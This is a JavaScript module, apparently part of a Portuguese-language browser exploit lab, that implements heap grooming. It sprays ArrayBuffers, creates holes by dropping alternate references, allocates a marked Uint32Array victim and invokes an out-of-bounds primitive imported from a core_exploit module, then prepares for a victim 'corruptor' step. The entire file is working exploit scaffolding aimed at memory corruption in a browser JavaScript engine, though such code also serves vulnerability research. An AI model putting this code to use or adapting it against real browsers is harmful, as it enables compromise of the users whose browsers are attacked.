// js/heap_groomer.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import { updateOOBConfigFromUI, OOB_CONFIG } from './config.mjs';
import * as Core from './core_exploit.mjs';

export let victim_object = null;
export let victim_object_type = 'TypedArray';
let spray_array_temp = [];

const FNAME_BASE_GROOMER = "HeapGroomer";

export async function prepareVictim(object_size_str) {
    const FNAME_PREP_VICTIM = `${FNAME_BASE_GROOMER}.prepareVictim`;
    victim_object = null;
    const object_size = parseInt(object_size_str);

    appLog(`Tentando preparar vítima com object_size: ${object_size_str} -> ${object_size}`, "info", FNAME_PREP_VICTIM);

    if (isNaN(object_size) || object_size <= 0) {
        appLog(`ERRO CRÍTICO: Tamanho do objeto (${object_size_str}) é inválido.`, "error", FNAME_PREP_VICTIM);
        return false;
    }
    if (object_size % 4 !== 0 && (victim_object_type === 'Uint32Array' || victim_object_type === 'TypedArray')) {
        appLog(`AVISO: Tamanho do objeto (${object_size}) não é múltiplo de 4. Pode não ser ideal para Uint32Array.`, "warn", FNAME_PREP_VICTIM);
    }

    const victim_typed_array_elements = Math.floor(object_size / 4);
    if (victim_typed_array_elements <= 0 && object_size > 0) {
         appLog(`ERRO CRÍTICO: Número de elementos calculado para ${victim_object_type} é zero ou negativo (${victim_typed_array_elements}) para object_size ${object_size}.`, "error", FNAME_PREP_VICTIM);
        return false;
    }

    try {
        victim_object = new Uint32Array(victim_typed_array_elements);
        victim_object_type = 'Uint32Array';
        for(let i=0; i < victim_object.length; i++) {
            victim_object[i] = (0xBB000000 | i) ;
        }
        appLog(`Vítima (${victim_object_type}, ${victim_object.length} elems, ${victim_object.byteLength}b) alocada. Padrão: 0xBB00xxxx`, 'good', FNAME_PREP_VICTIM);
        return true;
    } catch (e) {
        appLog(`ERRO CRÍTICO ao alocar objeto vítima: ${e.name} - ${e.message}`, "error", FNAME_PREP_VICTIM);
        console.error("Erro detalhado em prepareVictim:", e);
        victim_object = null;
        return false;
    }
}

export async function groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count, spray_obj_size_override, hole_creation_pattern) {
    const FNAME_GROOM = `${FNAME_BASE_GROOMER}.groomHeapExperimental`;
    appLog(`--- Iniciando Heap Grooming Experimental ---`, "test", FNAME_GROOM);
    appLog(`   Parâmetros: spray_count=${spray_count}, target_obj_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}, spray_obj_size_override=${spray_obj_size_override || 'N/A'}, hole_pattern=${hole_creation_pattern}`, "info", FNAME_GROOM);
    updateOOBConfigFromUI();

    spray_array_temp = []; // Limpa sprays anteriores para um novo estado

    const spray_obj_size = spray_obj_size_override > 0 ? spray_obj_size_override : target_object_size + 16; // Usa override ou default
    appLog(`   Fase 1: Spray com ${spray_count} objetos de ${spray_obj_size} bytes...`, "info", FNAME_GROOM);
    try {
        for (let i = 0; i < spray_count; i++) {
            spray_array_temp.push(new ArrayBuffer(spray_obj_size));
            if (i % 200 === 0 && i > 0) {
                 appLog(`     Spray parcial: ${i+1} objetos alocados...`, 'info', FNAME_GROOM);
                 await PAUSE_LAB(10);
            }
        }
        appLog(`   Fase 1: Spray concluído. ${spray_array_temp.length} objetos no array de spray.`, "info", FNAME_GROOM);
    } catch (e) {
        appLog(`ERRO CRÍTICO durante Fase 1 (Spray): ${e.name} - ${e.message}. Abortando grooming.`, "error", FNAME_GROOM);
        console.error("Erro detalhado na Fase 1 (Spray):", e);
        spray_array_temp = [];
        return false; // Indica falha no grooming
    }

    const num_holes_to_create = Math.min(Math.floor(spray_array_temp.length / (hole_creation_pattern === 'alternate_skip_one' ? 2 : 1)), intermediate_alloc_count);
    appLog(`   Fase 2: Tentando criar ${num_holes_to_create} buracos (padrão: ${hole_creation_pattern})...`, "info", FNAME_GROOM);
    let holes_created_count = 0;
    const temp_spray_for_holes = [...spray_array_temp]; // Copia para modificar
    spray_array_temp = []; // Vai repopular com os que sobrarem

    if (hole_creation_pattern === 'alternate_skip_one') {
        for (let i = 0; i < temp_spray_for_holes.length; i++) {
            if (i % 2 === 0 && holes_created_count < num_holes_to_create) { // Desaloca os pares (índice 0, 2, 4...)
                temp_spray_for_holes[i] = null;
                holes_created_count++;
            } else {
                spray_array_temp.push(temp_spray_for_holes[i]); // Mantém os ímpares
            }
        }
    } else if (hole_creation_pattern === 'first_n') {
        for (let i = 0; i < temp_spray_for_holes.length; i++) {
            if (i < num_holes_to_create) {
                temp_spray_for_holes[i] = null;
                holes_created_count++;
            } else {
                spray_array_temp.push(temp_spray_for_holes[i]);
            }
        }
    } // Adicionar mais padrões aqui (ex: 'last_n', 'block')
    else { // Padrão default (alternate_skip_one) ou se desconhecido
         for (let i = 0; i < temp_spray_for_holes.length; i++) {
            if (i % 2 === 0 && holes_created_count < num_holes_to_create) {
                temp_spray_for_holes[i] = null; holes_created_count++;
            } else { spray_array_temp.push(temp_spray_for_holes[i]); }
        }
    }
    appLog(`   Fase 2: ${holes_created_count} referências removidas. ${spray_array_temp.length} objetos de spray restantes (mantidos em spray_array_temp).`, "info", FNAME_GROOM);

    appLog(`   Fase 3: Tentando alocar vítima e buffer OOB...`, "info", FNAME_GROOM);
    victim_object = null;
    appLog("     Fase 3: Chamando Core.clearOOBEnvironment() para limpar o buffer OOB anterior...", "info", FNAME_GROOM);
    try {
        Core.clearOOBEnvironment();
        appLog("     Fase 3: Core.clearOOBEnvironment() concluído.", "good", FNAME_GROOM);
    } catch (e_clear) {
         appLog(`     Fase 3: ERRO ao chamar Core.clearOOBEnvironment(): ${e_clear.name} - ${e_clear.message}`, "error", FNAME_GROOM);
         console.error("Erro detalhado na Fase 3, chamada a Core.clearOOBEnvironment:", e_clear);
    }

    let victimPreparedSuccessfully = false;
    let oobConfiguredSuccessfully = false;

    appLog("     Fase 3: Chamando prepareVictim...", "info", FNAME_GROOM);
    try {
        if (target_object_size > 0) {
            victimPreparedSuccessfully = await prepareVictim(String(target_object_size));
            appLog(`     Fase 3: prepareVictim concluído. Sucesso: ${victimPreparedSuccessfully}`, victimPreparedSuccessfully ? 'good' : 'warn', FNAME_GROOM);
        } else {
            appLog("     Fase 3: Tamanho do objeto alvo inválido, não preparando vítima JS.", "warn", FNAME_GROOM);
        }
    } catch (e_prep_victim) {
        appLog(`     Fase 3: ERRO CRÍTICO DENTRO da chamada a prepareVictim: ${e_prep_victim.name} - ${e_prep_victim.message}`, "error", FNAME_GROOM);
        console.error("Erro detalhado na Fase 3, chamada a prepareVictim:", e_prep_victim);
    }

    appLog("     Fase 3: Chamando Core.triggerOOB_primitive...", "info", FNAME_GROOM);
    try {
        await Core.triggerOOB_primitive();
        if (Core.oob_array_buffer_real) {
            oobConfiguredSuccessfully = true;
            appLog(`     Fase 3: Core.triggerOOB_primitive aparentemente concluído com sucesso (buffer OOB existe).`, 'good', FNAME_GROOM);
        } else {
            appLog(`     Fase 3: Core.triggerOOB_primitive concluído, MAS Core.oob_array_buffer_real é NULO.`, 'error', FNAME_GROOM);
        }
    } catch (e_trigger_oob) {
        appLog(`     Fase 3: ERRO CRÍTICO DENTRO da chamada a Core.triggerOOB_primitive: ${e_trigger_oob.name} - ${e_trigger_oob.message}`, "error", FNAME_GROOM);
        console.error("Erro detalhado na Fase 3, chamada a triggerOOB_primitive:", e_trigger_oob);
    }

    if (victimPreparedSuccessfully && oobConfiguredSuccessfully) {
        appLog(`--- Heap Grooming Experimental Concluído (Fase 3 OK) ---`, "good", FNAME_GROOM);
        appLog(`   Verifique o log e tente usar o VictimFinder ou o VictimCorruptor agora.`, "info", FNAME_GROOM);
        return true;
    } else {
        appLog(`--- Heap Grooming Experimental Concluído com PROBLEMAS na Fase 3 (Vítima preparada: ${victimPreparedSuccessfully}, OOB configurado: ${oobConfiguredSuccessfully}) ---`, "warn", FNAME_GROOM);
        return false;
    }
}

export async function groomHeapButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE_GROOMER}.Handler`;
    appLog(`[${FNAME_HANDLER}] Botão 'Executar Grooming Experimental' clicado.`, "info", FNAME_HANDLER);

    const sprayCountEl = document.getElementById('groomSprayCount');
    const targetSizeEl = document.getElementById('groomTargetObjectSize');
    const interAllocsEl = document.getElementById('groomIntermediateAllocs');
    const sprayObjSizeEl = document.getElementById('groomSprayObjSize'); // Novo input
    const holePatternEl = document.getElementById('groomHolePattern'); // Novo select

    let spray_count = 200;
    let target_object_size;
    let intermediate_alloc_count = 50;
    let spray_obj_size_override = 0; // 0 ou inválido significa usar default (target_object_size + 16)
    let hole_creation_pattern = 'alternate_skip_one';

    if (sprayCountEl && sprayCountEl.value.trim() !== "") {
        const val = parseInt(sprayCountEl.value, 10);
        if (!isNaN(val) && val > 0) spray_count = val;
        else appLog(`Valor de Contagem de Spray '${sprayCountEl.value}' inválido. Usando padrão: ${spray_count}`, "warn", FNAME_HANDLER);
    } else { appLog(`Contagem de Spray não especificada. Usando padrão: ${spray_count}`, "info", FNAME_HANDLER); }

    updateOOBConfigFromUI(); // Garante que OOB_CONFIG está atualizado para fallback

    if (targetSizeEl && targetSizeEl.value.trim() !== "") {
        const val = parseInt(targetSizeEl.value, 10);
        if (!isNaN(val) && val > 0) { target_object_size = val; }
        else {
            appLog(`Tam. Obj. Alvo Grooming '${targetSizeEl.value}' inválido. Usando OOB_CONFIG.ALLOCATION_SIZE: ${OOB_CONFIG.ALLOCATION_SIZE}`, "warn", FNAME_HANDLER);
            target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
        }
    } else {
        target_object_size = OOB_CONFIG.ALLOCATION_SIZE;
        appLog(`Tam. Obj. Alvo Grooming não especificado. Usando OOB_CONFIG.ALLOCATION_SIZE: ${target_object_size}`, "info", FNAME_HANDLER);
    }
    if (target_object_size <= 0) {
        target_object_size = 288; // Fallback final
        appLog(`Tam. Obj. Alvo Grooming resultou em <=0. Usando fallback seguro: ${target_object_size}`, "warn", FNAME_HANDLER);
    }

    if (interAllocsEl && interAllocsEl.value.trim() !== "") {
        const val = parseInt(interAllocsEl.value, 10);
        if (!isNaN(val) && val >= 0) intermediate_alloc_count = val;
        else appLog(`Valor de Alocações Interm. '${interAllocsEl.value}' inválido. Usando padrão: ${intermediate_alloc_count}`, "warn", FNAME_HANDLER);
    } else { appLog(`Alocações Interm. não especificada. Usando padrão: ${intermediate_alloc_count}`, "info", FNAME_HANDLER); }

    if (sprayObjSizeEl && sprayObjSizeEl.value.trim() !== "") {
        const val = parseInt(sprayObjSizeEl.value, 10);
        if (!isNaN(val) && val > 0) spray_obj_size_override = val;
        else appLog(`Tam. Obj. Spray Override '${sprayObjSizeEl.value}' inválido. Usando default derivado de target_object_size.`, "warn", FNAME_HANDLER);
    } else { appLog(`Tam. Obj. Spray Override não especificado. Usando default.`, "info", FNAME_HANDLER); }
    
    if (holePatternEl) hole_creation_pattern = holePatternEl.value;

    appLog(`Parâmetros para groomHeapExperimental: spray=${spray_count}, target_size=${target_object_size}, inter_allocs=${intermediate_alloc_count}, spray_override_size=${spray_obj_size_override || 'N/A'}, hole_pattern=${hole_creation_pattern}`, "info", FNAME_HANDLER);
    
    const btn = document.getElementById('btnRunGroomingExperimental');
    if(btn) btn.disabled = true;
    await groomHeapExperimental(spray_count, target_object_size, intermediate_alloc_count, spray_obj_size_override, hole_creation_pattern);
    if(btn) btn.disabled = false;
}

export function clearSprayArrayButtonHandler() {
    const FNAME_CLEAR_SPRAY = `${FNAME_BASE_GROOMER}.clearSpray`;
    appLog(`Limpando spray_array_temp (tinha ${spray_array_temp.length} objetos)...`, "info", FNAME_CLEAR_SPRAY);
    spray_array_temp = [];
    // Forçar GC (não garantido, mas uma tentativa)
    // if (typeof gc === 'function') { gc(); appLog("gc() chamado.", "info", FNAME_CLEAR_SPRAY); }
    appLog(`spray_array_temp limpo.`, "good", FNAME_CLEAR_SPRAY);
}
